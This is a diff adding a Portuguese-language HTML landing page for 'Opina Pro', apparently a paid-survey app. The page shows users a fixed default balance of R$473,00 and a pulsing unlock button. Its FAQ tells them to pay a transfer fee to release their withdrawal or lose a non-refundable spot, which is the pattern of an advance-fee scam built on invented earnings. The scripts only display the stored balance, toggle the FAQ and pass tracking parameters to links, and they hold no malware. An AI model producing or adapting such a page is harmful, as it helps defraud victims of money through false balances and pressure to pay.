@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+  <link rel="icon" type="image/png" href="https://i.postimg.cc/4dz9xmvW/image.png">
+  <title>Explicativa Usuário do Opina Pro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: rgb(249, 250, 251);
+    }
+
+    /* Header Styles */
+    .header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: white;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      z-index: 50;
+      padding: 0.75rem 1rem;
+    }
+
+    .header-content {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      height: 2.5rem;
+    }
+
+    .valor-display {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      color: #004519;
+      background: rgb(0 201 83);
+      padding: 0.5rem 1rem;
+      border-radius: 0.5rem;
+      font-weight: 600;
+    }
+
+    /* Main Content Styles */
+    .main-content {
+      max-width: 42rem;
+      margin: 3rem auto 0;
+      padding: 2rem 1rem;
+    }
+
+    .content-box {
+      background: white;
+      border-radius: 1rem;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+      padding: 0.3rem;
+      margin-bottom: 1rem;
+    }
+
+    .logo-center {
+      width: 8rem;
+      margin: 0 auto 1.5rem;
+      display: block;
+    }
+
+    .title-text {
+      text-align: center;
+      font-size: 1.25rem;
+      margin-bottom: 1rem;
+    }
+
+    .video-container {
+      position: relative;
+      padding-bottom: 0.5rem;
+      margin-bottom: 2rem;
+    }
+
+    .subtitle-text {
+      text-align: center;
+      color: rgb(107, 114, 128);
+      font-size: 1rem;
+      margin-bottom: 0.3rem;
+    }
+
+    .unlock-button {
+      background-color: #00c853;
+      color: white;
+      font-weight: bold;
+      padding: 1rem 2rem;
+      border: none;
+      border-radius: 0.5rem;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      text-align: center;
+    }
+
+    .unlock-button:hover {
+      background-color: #00b34a;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+    transform: scale(1);
+  }
+  50% {
+    transform: scale(1.1);
+  }
+}
+
+/* Animar */
+.animate-pulse {
+  animation: pulse 2s infinite;
+}
+
+    /* FAQ Styles */
+    .faq-section {
+      margin-top: 2rem;
+    }
+
+    .faq-title {
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 1.5rem;
+      color: rgb(31, 41, 55);
+    }
+
+    .faq-item {
+      border: 1px solid rgb(229, 231, 235);
+      border-radius: 0.5rem;
+      margin-bottom: 0.5rem;
+      overflow: hidden;
+    }
+
+    .faq-question {
+      width: 100%;
+      padding: 1rem 1.5rem;
+      text-align: left;
+      background: white;
+      border: none;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+      font-weight: 500;
+    }
+
+    .faq-question:hover {
+      background: rgb(249, 250, 251);
+    }
+
+    .faq-answer {
+      padding: 1rem 1.5rem;
+      background: rgb(249, 250, 251);
+      display: none;
+    }
+
+    .faq-answer.active {
+      display: block;
+    }
+
+    .faq-icon {
+      transition: transform 0.3s;
+    }
+
+    .faq-icon.rotate {
+      transform: rotate(180deg);
+    }
+
+    /* Footer Styles */
+    .footer {
+      background: rgb(22, 22, 22);
+      border-top: 1px solid #00c853;
+      padding: 1.5rem;
+      margin-top: 2rem;
+    }
+
+    .footer-content {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 2rem;
+    }
+
+    .footer img {
+      height: 3rem;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-content">
+      <img src="https://i.postimg.cc/bwLJDsJ7/image-2.webp" alt="Opina Pro Logo" class="logo">
+      <div class="valor-display">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect width="20" height="14" x="2" y="5" rx="2" />
+          <line x1="2" x2="22" y1="10" y2="10" />
+        </svg>
+        <span id="valor">R$473,00</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="content-box">
+      <!-- <img src="https://i.postimg.cc/bwLJDsJ7/image-2.webp" alt="Opina Pro Logo" class="logo-center">-->
+      <p class="title-text">
+        Passo a passo para novos <br>
+        usuários do <strong>OpinaPro!</strong>
+      </p>
+
+      <!-- Wistia Video eufrasiodesnoyer3@gmail.com -->
+      <div class="video-container">
+        <script src="https://fast.wistia.com/player.js" async></script><script src="https://fast.wistia.com/embed/yiuhcrbvhv.js" async type="module"></script><style>wistia-player[media-id='yiuhcrbvhv']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/yiuhcrbvhv/swatch'); display: block; filter: blur(5px); padding-top:177.22%; }</style> <wistia-player media-id="yiuhcrbvhv"></wistia-player>
+      </div>
+      <p class="subtitle-text">
+        Antes de prosseguir, assista ao vídeo acima!
+      </p>
+      <div>
+        <a href="../link" id="unlockButton" class="unlock-button animate-pulse">
+          DESBLOQUEAR AGORA
+        </a>
+      </div>
+      
+    </div>
+
+    <!-- FAQ Section -->
+    <div class="faq-section">
+      <h2 class="faq-title">Dúvidas Frequentes</h2>
+      <div class="faq-item">
+        <button class="faq-question">
+          Por que tem essa taxa?
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>A transação bancária gera custos para nossa empresa, além do seu saque. Então, infelizmente, temos que repassar para nossos usuários apenas o custo da transferência e nada mais.</p>
+        </div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-question">
+          Se eu não pagar a taxa?
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>O cliente tem até o final do dia, após o suporte ter entrado em contato, para pagar. Caso não consiga, perderá sua vaga (VAGA NÃO É REEMBOLSÁVEL).</p>
+        </div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-question">
+          O que acontece após eu pagar?
+          <span class="faq-icon">▼</span>
+        </button>
+        <div class="faq-answer">
+          <p>Automaticamente, é liberado o aplicativo e você poderá continuar avaliando e solicitar seu saque disponível.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-content">
+      <img src="https://i.postimg.cc/c1tgSpHF/image.png" alt="Certificado 1">
+      <img src="https://i.postimg.cc/HsGJs68d/image.png" alt="Certificado 2">
+    </div>
+  </footer>
+<!-- versão Script Valor-->
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const valorElement = document.getElementById('valor');
+    if (valorElement) {
+      valorElement.textContent = `SALDO: R$ ${localStorage.getItem('valor') || '473,00'}`;
+    }
+
+    const unlockButton = document.getElementById('unlockButton');
+    if (unlockButton) {
+      unlockButton.style.display = 'block';
+    }
+  });
+</script>
+
+
+<!-- Versão script faq-->
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    const faqQuestions = document.querySelectorAll('.faq-question');
+    if (faqQuestions.length) {
+      faqQuestions.forEach(button => {
+        button.addEventListener('click', () => {
+          const answer = button.nextElementSibling;
+          const icon = button.querySelector('.faq-icon');
+
+          // Close all other answers
+          document.querySelectorAll('.faq-answer.active').forEach(item => {
+            if (item !== answer) item.classList.remove('active');
+          });
+          document.querySelectorAll('.faq-icon.rotate').forEach(item => {
+            if (item !== icon) item.classList.remove('rotate');
+          });
+
+          // Toggle current answer
+          answer.classList.toggle('active');
+          icon.classList.toggle('rotate');
+        });
+      });
+    }
+  });
+</script>
+
+
+<!-- Versão UTMS -->
+<script>
+  function adicionarParametrosAosLinks() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const links = document.querySelectorAll('a[href]');
+
+    links.forEach(link => {
+      const href = new URL(link.href);
+      urlParams.forEach((value, key) => {
+        href.searchParams.set(key, value);
+      });
+      link.href = href.toString();
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+</script>
+
+<!-- Script Utms -->
+</body>
+</html>
